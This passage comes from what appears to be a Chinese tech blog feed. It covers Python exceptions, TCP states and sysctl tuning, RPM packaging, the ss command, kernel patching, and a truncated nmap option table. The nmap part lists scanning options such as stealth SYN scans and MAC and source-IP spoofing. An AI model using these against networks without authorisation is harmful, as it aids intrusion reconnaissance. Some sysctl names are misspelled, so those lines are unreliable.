class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># err_reraise.py</span><br><span class="line"></span><br><span class="line">def foo(s):</span><br><span class="line">    n = int(s)</span><br><span class="line">    if n==0:</span><br><span class="line">        raise ValueError(&apos;invalid value: %s&apos; % s)</span><br><span class="line">    return 10 / n</span><br><span class="line"></span><br><span class="line">def bar():</span><br><span class="line">    try:</span><br><span class="line">        foo(&apos;0&apos;)</span><br><span class="line">    except ValueError as e:</span><br><span class="line">        print(&apos;ValueError!&apos;)</span><br><span class="line">        raise</span><br><span class="line"></span><br><span class="line">bar()</span><br></pre></td></tr></table></figure><p>在<code>bar()</code>函数中，我们明明已经捕获了错误，但是，打印一个<code>ValueError!</code>后，又把错误通过<code>raise</code>语句抛出去了，这不有病么？</p><p>其实这种错误处理方式不但没病，而且相当常见。捕获错误目的只是记录一下，便于后续追踪。但是，由于当前函数不知道应该怎么处理该错误，所以，最恰当的方式是继续往上抛，让顶层调用者去处理。好比一个员工处理不了一个问题时，就把问题抛给他的老板，如果他的老板也处理不了，就一直往上抛，最终会抛给CEO去处理。</p><p><code>raise</code>语句如果不带参数，就会把当前错误原样抛出。</p><p><br></p><h4 id="断言"><a href="#断言" class="headerlink" title="断言"></a>断言</h4><p>凡是用<code>print()</code>来辅助查看的地方，都可以用断言（assert）来替代：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def foo(s):</span><br><span class="line">    n = int(s)</span><br><span class="line">    assert n != 0, &apos;n is zero!&apos;</span><br><span class="line">    return 10 / n</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    foo(&apos;0&apos;)</span><br></pre></td></tr></table></figure><p><code>assert</code>的意思是，表达式<code>n != 0</code>应该是<code>True</code>，否则，根据程序运行的逻辑，后面的代码肯定会出错。</p><p>如果断言失败，<code>assert</code>语句本身就会抛出<code>AssertionError</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ python err.py</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  ...</span><br><span class="line">AssertionError: n is zero!</span><br></pre></td></tr></table></figure><p>程序中如果到处充斥着<code>assert</code>，和<code>print()</code>相比也好不到哪去。不过，启动Python解释器时可以用<code>-O</code>参数来关闭<code>assert</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ python -O err.py</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  ...</span><br><span class="line">ZeroDivisionError: division by zero</span><br></pre></td></tr></table></figure><p>关闭后，你可以把所有的<code>assert</code>语句当成<code>pass</code>来看。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux Tcp状态以及 sysctl.conf  配置参数</title>
      <link href="/2018/01/23/network/Linux-Tcp%E7%8A%B6%E6%80%81%E4%BB%A5%E5%8F%8A-sysctl-conf-%E9%85%8D%E7%BD%AE%E5%8F%82%E6%95%B0/"/>
      <url>/2018/01/23/network/Linux-Tcp%E7%8A%B6%E6%80%81%E4%BB%A5%E5%8F%8A-sysctl-conf-%E9%85%8D%E7%BD%AE%E5%8F%82%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="Linux-Tcp-状态-以及-sysctl-conf-配置参数"><a href="#Linux-Tcp-状态-以及-sysctl-conf-配置参数" class="headerlink" title="Linux Tcp 状态 以及 sysctl.conf  配置参数"></a>Linux Tcp 状态 以及 sysctl.conf  配置参数</h3><p>说明： 通常情况下:一个正常的TCP连接，都会有三个阶段:1、TCP三次握手;2、数据传送;3、TCP四次挥手</p><p>里面的几个概念：</p><ul><li>SYN: (同步序列编号,Synchronize Sequence Numbers)</li><li>ACK: (确认编号,Acknowledgement Number)</li><li>FIN: (结束标志,FINish)</li></ul><a id="more"></a><p><br></p><p>####TCP三次握手(创建 OPEN)</p><ol><li>客户端发起一个和服务创建TCP链接的请求，这里是SYN(J)</li><li>服务端接受到客户端的创建请求后，返回两个信息： SYN(K) + ACK(J+1)</li><li>客户端在接受到服务端的ACK信息校验成功后(J与J+1)，返回一个信息：ACK(K+1)</li><li>服务端这时接受到客户端的ACK信息校验成功后(K与K+1)，不再返回信息，后面进入数据通讯阶段</li></ol><h4 id="数据通讯"><a href="#数据通讯" class="headerlink" title="数据通讯"></a>数据通讯</h4><ol><li>客户端/服务端 read/write数据包</li></ol><h4 id="TCP四次握手-关闭-finish"><a href="#TCP四次握手-关闭-finish" class="headerlink" title="TCP四次握手(关闭 finish)"></a>TCP四次握手(关闭 finish)</h4><ol><li>客户端发起关闭请求，发送一个信息：FIN(M)</li><li>服务端接受到信息后，首先返回ACK(M+1),表明自己已经收到消息。</li><li>服务端在准备好关闭之前，最后发送给客户端一个 FIN(N)消息，询问客户端是否准备好关闭了</li><li>客户端接受到服务端发送的消息后，返回一个确认信息: ACK(N+1)</li><li>最后，服务端和客户端在双方都得到确认时，各自关闭或者回收对应的TCP链接。</li></ol><p>####详细的状态说明(以及linux相关参数调整)</p><p><code>/etc/sysctl.conf</code></p><ol><li>SYN_SEND<ol><li>客户端尝试连接服务端，通过open方法。也就是TCP三次握手中的第一步后, 客户端状态</li><li><code>sysctl -w net.ipv4.tcp_syn_retries = 2</code> 作为客户端可以设置SYN包的重试次数，默认5次(大约180s)</li></ol></li><li>SYN_RECEIVED<ol><li>服务接收创建请求的SYN之后，也就是TCP三次握手的第二步，发送ACK数据包之前。</li><li>注意服务端状态，一般15个左右正常，如果很大，怀疑遭受SYN_GLOOD攻击。</li><li><code>sysctl -w net.ipv4.tcp_max_syn_backing = 4096</code>, 设置该状态的等待队列数，默认1024，调大后可以适当放置syn_flood, 可参见 <code>man 7 tcp</code>.</li><li><code>sysctl -w net.ipv4.tcp_syncookies = 1</code> ，打开syn backing队列不足的时候，提供一种机制临时将syn链接换出</li><li><code>sysctl -w net.ipv4.tcp_syn_retries = 2</code> 作为客户端可以设置SYN包的重试次数，默认5次(大约180s)</li></ol></li><li>ESTABLISHED<ol><li>客户端接受到服务端的ACK包后的状态，服务端在发出ACK在一定时间后即为 ESTABLISHED</li><li><code>sysctl -w net.ipv4.tcp_keepalive_time = 1200</code> 默认是7200秒(2小时). 系统针对空闲链接会进行心跳检查，如果超过 <code>net.ipv4.tcp_keepalive_probes * net.ipv4.tcp_keepalive_intvl = 默认 11 分,</code>终止对应的tcp链接，可适当调整心跳检查频率。</li><li>目前线上的监控<code>waring:600 , critial : 800</code></li></ol></li><li>FIN_WAIT1<ol><li>主动关闭的一方，在发出FIN请求之后，也就是TCP四次挥手的第一步</li></ol></li><li>CLOSE_WAIT<ol><li>被关闭的一方，在接受到客户端的FIN后，也就是在TCP四次挥手的第二步。</li></ol></li><li>FIN_WAIT2<ol><li>主动关闭的一方，在接受到被动关闭一方的ACK后，也就是TCP四次挥手的第二步。</li><li><code>sysctl -w net.ipv4.tcp_fin_timeout=30</code>, 可以设定被动关闭方返回FIN后的超时时间，有效回收链接，避免syn-flood.</li></ol></li><li>LASK_ACK <ol><li>被关闭一方，在发送ACK后一段时间后(确保客户端已经收到), 在发起一个FIN请求。也就是TCP四次握手第三步</li></ol></li><li>TIME_WAIT<ol><li>主动关闭的一方，在收到被动关闭的FIN包后，发送ACK。这就是TCP四次握手的第四部。</li><li><code>sysctl -w net.ipv4.tcp_tw_recycle = 1</code> 打开快速回收TIME_WAIT。<code>Enabling this option is not recommended since this causes problems when working with NAT (Network Address Translation)</code></li><li><code>sysctl -w net.ipv4.tcp_tw_reuse = 1</code> 快速回收并重用TIME_WAIT的链接。</li><li><code>net.ipv4.tcp_max_tw_buckets</code> 处于time_wait状态的最多连接数， 默认为 180000。</li></ol></li></ol><p><strong>补充：</strong></p><ol><li>主动关闭方在接收到被动关闭放的FIN请求后，发送成功给对方一个ACK后，将自己的状态由FIN_WAIT2 修改为TIME_WAIT， 而必须再等2倍的MSL(Maximun Segment Lifetime, MSL是一个数据报在internetwork中能存在的时间) 时间之后，双方才能把状态都改为CLOSED以关闭链接。目前RHEL中保持TIME_WAIT状态的时间为60s。</li><li>keepalive策略可以有效避免进行三次握手和四次挥手的动作。</li></ol><p><a href="https://blog.csdn.net/chenfengdejuanlian/article/details/53761004" target="_blank" rel="noopener">TCP报文之-tcp dup ack 、tcp Out-of-Order</a></p><p><a href="https://blog.csdn.net/kofandlizi/article/details/8106841" target="_blank" rel="noopener">tcpdump抓取HTTP包 – 以及 Tcp 参数 linux设置</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Centos </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>RPM 打包</title>
      <link href="/2018/01/20/rebuild/RPM-%E6%89%93%E5%8C%85/"/>
      <url>/2018/01/20/rebuild/RPM-%E6%89%93%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<p>RPM（Redhat Package Manager）是用于Redhat、CentOS、Fedora等Linux 分发版（distribution）的常见的软件包管理器。 同时rpm打包需要特定的目录及结构。</p><p><br><br><a id="more"></a></p><h4 id="系统准备"><a href="#系统准备" class="headerlink" title="系统准备"></a>系统准备</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install rpmdevtools</span><br></pre></td></tr></table></figure><p><code>rpmdev-setuptree</code> 程序将创建 <code>~/rpmbuild</code> 目录，以及一系列预设的子目录（如 <code>SPECS</code> 和 <code>BUILD</code>），你将使用它们作为打包目录。另外，还会创建 <code>~/.rpmmacros</code> 文件，它用于设置各种选项。</p><h4 id="RPM打包基本过程-与-基础知识"><a href="#RPM打包基本过程-与-基础知识" class="headerlink" title="RPM打包基本过程 与 基础知识"></a><strong>RPM打包基本过程 与 基础知识</strong></h4><p>一般情况，您应该把源代码包，比如由开发者发布的以 <code>.tar.gz</code> 结尾的文件，放入 <code>~/rpmbuild/SOURCES</code> 目录。将<code>.spec</code> 文件放入 <code>~/rpmbuild/SPECS</code> 目录，并命名为 “<em>软件包名</em>.spec” 。当然， <em>软件包名</em> 就是最终 RPM 包的名字。为了创建二进制（Binary RPM）和源码软件包（SRPM），您需要将目录切换至 <code>~/rpmbuild/SPECS</code> 并执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ rpmbuild -ba NAME.spec</span><br></pre></td></tr></table></figure><table><thead><tr><th>阶段</th><th>读取的目录</th><th>写入的目录</th><th>具体动作</th></tr></thead><tbody><tr><td><code>%prep</code></td><td><code>%_sourcedir</code></td><td><code>%_builddir</code></td><td>读取位于 <code>%_sourcedir</code> 目录的源代码和 patch 。之后，解压源代码至 <code>%_builddir</code> 的子目录并应用所有 patch。</td></tr><tr><td><code>%build</code></td><td><code>%_builddir</code></td><td><code>%_builddir</code></td><td>编译位于 <code>%_builddir</code> 构建目录下的文件。通过执行类似 “<code>./configure &amp;&amp; make</code>“ 的命令实现。</td></tr><tr><td><code>%install</code></td><td><code>%_builddir</code></td><td><code>%_buildrootdir</code></td><td>读取位于 <code>%_builddir</code> 构建目录下的文件并将其安装至 <code>%_buildrootdir</code> 目录。这些文件就是用户安装 RPM 后，最终得到的文件。注意一个奇怪的地方: <em>最终安装目录</em> <strong>不是</strong> <em>构建目录</em>。通过执行类似 “<code>make install</code>“ 的命令实现。</td></tr><tr><td><code>%check</code></td><td><code>%_builddir</code></td><td><code>%_builddir</code></td><td>检查软件是否正常运行。通过执行类似 “<code>make test</code>“ 的命令实现。很多软件包都不需要此步。</td></tr><tr><td><code>bin</code></td><td><code>%_buildrootdir</code></td><td><code>%_rpmdir</code></td><td>读取位于 <code>%_buildrootdir</code> 最终安装目录下的文件，以便最终在 <code>%_rpmdir</code> 目录下创建 RPM 包。在该目录下，不同架构的 RPM 包会分别保存至不同子目录， “<code>noarch</code>“ 目录保存适用于所有架构的 RPM 包。这些 RPM 文件就是用户最终安装的 RPM 包。</td></tr><tr><td><code>src</code></td><td><code>%_sourcedir</code></td><td><code>%_srcrpmdir</code></td><td>创建源码 RPM 包（简称 SRPM，以<code>.src.rpm</code> 作为后缀名），并保存至 <code>%_srcrpmdir</code> 目录。SRPM 包通常用于审核和升级软件包。</td></tr></tbody></table><p>在 <code>rpmbuild</code> 中，对上表中的每个宏代码都有对应的目录：</p><table><thead><tr><th>宏代码</th><th>名称</th><th>默认位置</th><th>用途</th></tr></thead><tbody><tr><td><code>%_specdir</code></td><td>Spec 文件目录</td><td><code>~/rpmbuild/SPECS</code></td><td>保存 RPM 包配置（<code>.spec</code>）文件</td></tr><tr><td><code>%_sourcedir</code></td><td>源代码目录</td><td><code>~/rpmbuild/SOURCES</code></td><td>保存源码包（如 .tar 包）和所有 patch 补丁</td></tr><tr><td><code>%_builddir</code></td><td>构建目录</td><td><code>~/rpmbuild/BUILD</code></td><td>源码包被解压至此，并在该目录的子目录完成编译</td></tr><tr><td><code>%_buildrootdir</code></td><td>最终安装目录</td><td><code>~/rpmbuild/BUILDROOT</code></td><td>保存 %install 阶段安装的文件</td></tr><tr><td><code>%_rpmdir</code></td><td>标准 RPM 包目录</td><td><code>~/rpmbuild/RPMS</code></td><td>生成/保存二进制 RPM 包</td></tr><tr><td><code>%_srcrpmdir</code></td><td>源代码 RPM 包目录</td><td><code>~/rpmbuild/SRPMS</code></td><td>生成/保存源码 RPM 包(SRPM)</td></tr></tbody></table><p>如果某一阶段失败，请查看输出信息以了解失败<em>原因</em>，并根据需要修改 <code>.spec</code> 文件。</p><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpmdev-setuptree</span><br></pre></td></tr></table></figure><h5 id="生成目录如下"><a href="#生成目录如下" class="headerlink" title="生成目录如下:"></a><strong>生成目录如下:</strong></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">rpmbuild/</span><br><span class="line">├── BUILD</span><br><span class="line">├── RPMS</span><br><span class="line">├── SOURCES</span><br><span class="line">├── SPECS</span><br><span class="line">└── SRPMS</span><br></pre></td></tr></table></figure><p><strong>也可以自己创建</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p ~/rpmbuild/&#123;BUILD,RPMS,SOURCES,SPECS,SRPMS&#125;</span><br></pre></td></tr></table></figure><h5 id="示例代码-hello-c"><a href="#示例代码-hello-c" class="headerlink" title="示例代码  hello.c"></a><strong>示例代码</strong>  <code>hello.c</code></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;hello,world&quot;);</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>打包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir hello-1</span><br><span class="line">mv hello.c hello-1</span><br><span class="line">tar -czvf hello-1.tar.gz hello-1</span><br><span class="line">mv hello-1.tar.gz SOURCES/</span><br></pre></td></tr></table></figure></li></ul><h5 id="编写hello-spec"><a href="#编写hello-spec" class="headerlink" title="编写hello.spec"></a><strong>编写hello.spec</strong></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Name:hello</span><br><span class="line">Version:  1</span><br><span class="line">Release:1%&#123;?dist&#125;</span><br><span class="line">Summary: hello,world program</span><br><span class="line"></span><br><span class="line">Group: Application</span><br><span class="line">License: GPL</span><br><span class="line">URL:https://www.gangzai.online</span><br><span class="line">Source: hello-1.tar.gz</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">%description</span><br><span class="line">hello,world</span><br><span class="line"></span><br><span class="line">%prep</span><br><span class="line">%setup -q</span><br><span class="line"></span><br><span class="line">%build    ## 自动会到BUILD目录下查找与tar.gz同名文件夹,进入执行 %build 所指示命令</span><br><span class="line">gcc hello.c -o hello</span><br><span class="line"></span><br><span class="line">%install</span><br><span class="line">install -m 755 hello /home/postgres/hello</span><br></pre></td></tr></table></figure><h5 id="执行过程"><a href="#执行过程" class="headerlink" title="执行过程"></a><strong>执行过程</strong></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpmbuild -ba SPEC/hello.spec</span><br></pre></td></tr></table></figure><p><img src="/img/linux/rpm/rpm_build_exit_0.png" alt="rpmbuild -ba hello.spec"><br><img src="/img/linux/rpm/rpm_filename.png" alt="文件名对应"></p><h5 id="形成目录结构"><a href="#形成目录结构" class="headerlink" title="形成目录结构"></a><strong>形成目录结构</strong></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── BUILD</span><br><span class="line">│   └── hello-1</span><br><span class="line">├── BUILDROOT</span><br><span class="line">├── RPMS</span><br><span class="line">│   └── x86_64</span><br><span class="line">├── SOURCES</span><br><span class="line">│   └── hello-1.tar.gz</span><br><span class="line">├── SPECS</span><br><span class="line">│   └── hello.spec</span><br><span class="line">└── SRPMS</span><br><span class="line">    └── hello-1-1.el7.centos.src.rpm</span><br><span class="line"></span><br><span class="line">8 directories, 3 filess</span><br></pre></td></tr></table></figure><h5 id="安装-RPM包"><a href="#安装-RPM包" class="headerlink" title="安装 RPM包"></a>安装 RPM包</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -i SRPMS/hello-1-1.el7.centos.src.rpm</span><br></pre></td></tr></table></figure><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><p><a href="https://jin-yang.github.io/post/linux-create-rpm-package.html" target="_blank" rel="noopener">RPM 包制作</a></p></li><li><p><a href="https://fedoraproject.org/wiki/How_to_create_an_RPM_package/zh-cn" target="_blank" rel="noopener">How to create an RPM package/zh-cn</a></p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Commands </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ss</title>
      <link href="/2018/01/18/commands/ss/"/>
      <url>/2018/01/18/commands/ss/</url>
      
        <content type="html"><![CDATA[<ul><li>ss</li><li>不使用netstat的原因</li><li>iproute2</li></ul><a id="more"></a><p><br></p><h4 id="SS简介"><a href="#SS简介" class="headerlink" title="SS简介"></a>SS简介</h4><p>SS命令是一个用来查看socket信息的命令，可以通过man ss可以查看。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">NAME</span><br><span class="line">       ss - another utility to investigate sockets</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">       ss [options] [ FILTER ]</span><br><span class="line"></span><br><span class="line">DESCRIPTION</span><br><span class="line">       ss is used to dump socket statistics. It allows showing information similar to netstat.  It can display more TCP and state informations than other tools.</span><br></pre></td></tr></table></figure><h4 id="不使用netstat的原因"><a href="#不使用netstat的原因" class="headerlink" title="不使用netstat的原因"></a>不使用netstat的原因</h4><p>当服务器的socket连接数量变得非常大时，无论是使用netstat命令还是直接cat /proc/net/tcp，执行速度都会很慢。可能你不会有切身的感受，但请相信我，当服务器维持的连接达到上万个的时候，使用netstat等于浪费 生命，而用ss才是节省时间。</p><p>天下武功唯快不破。ss快的秘诀在于，它利用到了TCP协议栈中tcp_diag。tcp_diag是一个用于分析统计的模块，可以获得Linux 内核中第一手的信息，这就确保了ss的快捷高效。</p><h4 id="iproute2-工具命令"><a href="#iproute2-工具命令" class="headerlink" title="iproute2 工具命令"></a>iproute2 工具命令</h4><table><thead><tr><th>用途</th><th>net-tool (被淘汰)</th><th>iproute2</th></tr></thead><tbody><tr><td>地址和链路配置</td><td>ifconfig</td><td>ip addr, ip link</td></tr><tr><td>路由器</td><td>route</td><td>ip route</td></tr><tr><td>邻居</td><td>arp</td><td>ip neigh</td></tr><tr><td>VLAN</td><td>vconfig</td><td>ip link</td></tr><tr><td>隧道</td><td>iptunnel</td><td>ip tunnel</td></tr><tr><td>组播</td><td>ipmaddr</td><td>ip maddr</td></tr><tr><td>统计</td><td>netstat</td><td>ss</td></tr></tbody></table><p><a href="http://roclinux.cn/?p=2420" target="_blank" rel="noopener">ss-ip addr</a></p>]]></content>
      
      
      <categories>
          
          <category> 命令篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Commands </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Kernel-基础知识</title>
      <link href="/2018/01/18/kernel/Kernel-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
      <url>/2018/01/18/kernel/Kernel-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<p>内核基本知识:</p><ul><li>内核结构</li><li>补丁</li><li>内核编译</li></ul><a id="more"></a><p><br></p><h4 id="内核代码树介绍"><a href="#内核代码树介绍" class="headerlink" title="内核代码树介绍:"></a>内核代码树介绍:</h4><p>linux-2.6.29</p><p>｜－arch : 包含和硬件体系结构相关的代码</p><p>｜－block : 硬盘调度算法，不是驱动</p><p>｜－firmware : 固件，如BOIS</p><p>｜－Documentation: 标准官方文档</p><p>｜－dirver : linux设备驱动</p><p>｜－fs : 内核所支持的文件体系</p><p>｜－include ：头文件。linux/module.h linux/init.h 常用库。</p><p>｜－init ：库文件代码，C库函数在内核中的实现。</p><p>​    init/main.c -&gt;start_kernel-&gt;内核执行第一条代码</p><p>｜－ipc : 进程件通信</p><p>｜－mm ：内存管理</p><p>｜－kernel : 内核核心部分，包括进程调度等</p><p>｜－net ：网络协议</p><p>｜－sound : 所有音频相关</p><h4 id="内核补丁"><a href="#内核补丁" class="headerlink" title="内核补丁:"></a>内核补丁:</h4><p><strong>补丁基于某个版本内核生成的，用于升级旧版本内核。</strong> </p><ul><li>对应版本的补丁只能用于对应版本的内核</li></ul><ul><li>如果在已打补丁的内核中再打补丁，需要先卸载原先补丁。</li></ul><ol><li><p>制作补丁:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diff -Nur linux-2.6.30/ linux-2.6.30.1/ &gt; linux-2.6.30.1.patch</span><br></pre></td></tr></table></figure></li><li><p>打补丁:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd linux-2.6.30//！！注意在原文件夹的目录中打补丁</span><br><span class="line">patch -p1 &lt; ../linux-2.6.30.1.patch//-p1是忽略一级目录</span><br><span class="line"></span><br><span class="line">##单文件</span><br><span class="line">patch vimrc &lt; vim.1.patch    // 即可</span><br></pre></td></tr></table></figure></li><li><p>撤销补丁</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd linux-2.6.30 //！！注意在原文件夹的目录中打补丁</span><br><span class="line">patch -R &lt; ../linux-2.6.30.1.patch//撤销补丁</span><br></pre></td></tr></table></figure><p>​</p></li></ol><h4 id="内核与模块编译"><a href="#内核与模块编译" class="headerlink" title="内核与模块编译"></a>内核与模块编译</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make = make bzImage + make modules</span><br></pre></td></tr></table></figure><ol><li>如果只编译内核， 即只编译配置文件中的  -y 选项， 可以直接用命令<code>make bzImage</code></li><li>如果只编译模块， 即只编译配置文件中的 -m 选项, 可以直接使用 <code>make modules</code> </li></ol><p>只是想单独编译一个模块， 则可以使用:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -C /root/linux-2.6.29/xxx/  M=`pwd` module</span><br></pre></td></tr></table></figure><p>//<code>-C</code> 指定内核makefile的路径，可以使用相对路径。</p><p>//<code>-M</code> 指定要编译的文件的路径，同样使用相对路径。</p><p>编译生成的模块可以指定存放目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -C /root/linux-2.6.29/xxx M=`pwd`  modules_install INSTALL_MOD_PATH=/modules/</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Arm </tag>
            
            <tag> Kernel </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>nmap 参数</title>
      <link href="/2018/01/15/commands/nmap-%E5%8F%82%E6%95%B0/"/>
      <url>/2018/01/15/commands/nmap-%E5%8F%82%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<p>Nmap 功能介绍:</p><ol><li>主机存活检测</li><li>端口探测</li><li>服务识别</li><li>操作系统识别</li><li>硬件地址检测</li><li>服务版本识别</li><li>漏洞扫描,使用nmap自带脚本</li></ol><a id="more"></a><p><br></p><h4 id="namp"><a href="#namp" class="headerlink" title="namp"></a><a href="https://nmap.org/" target="_blank" rel="noopener">namp</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -&#123;type(s)&#125;  -&#123;opt(s)&#125;  &#123;target&#125;</span><br></pre></td></tr></table></figure><p><strong>常用选项</strong></p><table><thead><tr><th>扫描选项</th><th>名称</th><th>功能</th></tr></thead><tbody><tr><td>-g</td><td>指定源端口</td><td>使用特定的源端口发送数据包</td></tr><tr><td>–spoof_mac</td><td>Mac欺骗</td><td>创建虚假Mac地址发送数据包。可以随机化Mac地址</td></tr><tr><td>-S</td><td>源IP地址</td><td>伪造的源IP地址或者告诉Nmap使用哪个IP地址</td></tr><tr><td>-e</td><td>选择以太网接口</td><td>选择哪个网卡发送和接收数据</td></tr><tr><td>-F</td><td>快速扫描</td><td>在Nmap-services文件中将默认扫描缩减到100端口</td></tr><tr><td>-P</td><td>确定端口范围</td><td>选择扫描的端口</td></tr><tr><td>-R</td><td>反向Lookup</td><td>强制反向Lookup</td></tr><tr><td>-N</td><td>DNS解析</td><td>指向反向lookup</td></tr><tr><td>-n</td><td>非DNS解析</td><td>不进行反向lookup</td></tr><tr><td>-h</td><td>帮助文档</td><td>提供Nmap的帮助文档</td></tr><tr><td>-6</td><td>启用IPv6</td><td>扫描IPv6</td></tr><tr><td>-A</td><td>激进型</td><td>立刻启用许多扫描选项。慎用</td></tr><tr><td>-T(0-5)</td><td>时间选项</td><td>指定你想要的扫描激进程序</td></tr><tr><td>–scan_delay</td><td>添加延迟</td><td>在探测之间增加延迟</td></tr><tr><td>-sV</td><td>服务版本</td><td>探测服务软件的版本</td></tr></tbody></table><p><strong>常用扫描类型</strong></p><table><thead><tr><th style="text-align:center">扫描类型</th><th style="text-align:center">名称</th><th style="text-align:center">功能功能</th></tr></thead><tbody><tr><td style="text-align:center">-sA</td><td style="text-align:center">ACK扫描</td><td style="text-align:center">检测端口是否开放。可用于探测防火墙</td></tr><tr><td style="text-align:center">-sP</td><td style="text-align:center">ping扫描</td><td style="text-align:center">快速网络发现</td></tr><tr><td style="text-align:center">-sR</td><td style="text-align:center">PRC扫描</td><td style="text-align:center">定位PRC应用。对成功扫描的机器进行记录</td></tr><tr><td style="text-align:center">-sS</td><td style="text-align:center">TCP SYN扫描</td><td style="text-align:center">快速和隐蔽的扫描。半开放扫描</td></tr><tr><td style="text-align:center">-sT</td><td style="text-align:center">TCP扫描</td><td style="text-align:center">完全建立链接，没有效率，容易引起注意</td></tr><tr><td style="text-align:center">-sU</td><td style="text-align:center">UDP扫描</td><td 